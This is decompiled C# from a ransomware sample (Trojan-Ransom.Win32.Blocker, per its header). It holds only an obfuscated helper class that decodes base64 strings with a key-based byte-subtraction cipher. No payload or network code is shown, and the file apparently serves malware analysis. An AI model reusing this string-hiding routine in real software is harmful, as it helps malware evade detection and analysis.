// Decompiled with JetBrains decompiler
// Type: EHMIWRQ
// Assembly: ServerPHP, Version=1.7.0.1, Culture=neutral, PublicKeyToken=null
// MVID: 6F25B3EA-9C2B-406D-A5C7-3B7C6942C4C5
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.kwu-cbd4f8ac3865079e515f22b836eb2d279bf8687da866b97896c91bd38f105d09.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Text;

public class EHMIWRQ
{
  public static string VIJVUUV(string Input, string IXBXFGP)
  {
    string str;
    try
    {
      str = Encoding.UTF8.GetString(EHMIWRQ.FQNGDRE(Convert.FromBase64String(Input), Encoding.UTF8.GetBytes(IXBXFGP)));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public static byte[] FQNGDRE(byte[] Input, byte[] IXBXFGP)
  {
    int num1 = (int) Input[checked (Input.Length - 1)];
    byte[] numArray1 = new byte[checked (Input.Length - 2 + 1)];
    short index1 = 0;
    byte[] numArray2;
    try
    {
      int num2 = checked (Input.Length - 2);
      int index2 = 0;
      while (index2 <= num2)
      {
        if ((int) index1 >= IXBXFGP.Length)
          index1 = (short) 0;
        if (index2 < checked (Input.Length - 1))
        {
          numArray1[index2] = Convert.ToByte(checked ((int) Input[index2] - unchecked (numArray1.Length % IXBXFGP.Length) - (int) IXBXFGP[(int) index1] + num1));
          checked { ++index1; }
        }
        checked { ++index2; }
      }
      numArray2 = numArray1;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      numArray2 = numArray1;
      ProjectData.ClearProjectError();
    }
    return numArray2;
  }
}
